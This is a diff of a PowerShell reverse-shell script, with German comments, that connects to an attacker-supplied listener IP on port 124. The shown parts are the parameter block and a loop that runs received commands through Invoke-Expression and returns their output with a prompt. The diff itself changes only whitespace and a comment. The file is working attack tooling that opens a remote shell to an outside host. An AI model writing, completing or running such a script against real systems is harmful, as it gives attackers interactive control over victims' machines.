@@ -1,11 +1,11 @@
 # PowerShell-only Reverse Shell (keine cmd.exe, keine externen Tools)
 # Dieses Skript verbindet sich mit einem Listener und führt PowerShell-Befehle aus.
-# NEW
+
 # --- KONFIGURATION START ---
 Param(
     [Parameter(Mandatory=$true)] # Macht die Angabe von -ip Pflicht
     [string]$ip,                 # IP-Adresse des Angreifers/Listeners
-    
+
     # Der Port wird hier wieder fest im Skript gesetzt, da Sie nur die IP als Parameter wollten
     [int]$port = 124             # Standard-Port (kann hier angepasst werden)
 )
@@ -62,7 +62,7 @@ try {
                 # Führe den Befehl aus und fange sowohl Standard-Output als auch Fehler ab
                 $output = Invoke-Expression $command 2>&1 | Out-String;
                 # Write-Log "Command executed. Output length: $($output.Length)."
-                
+
                 # Sende die Ausgabe zurück zum Listener
                 $sw.WriteLine($output + (Get-Location).Path + "> "); # Füge den aktuellen Pfad und Prompt hinzu
                 $sw.Flush();
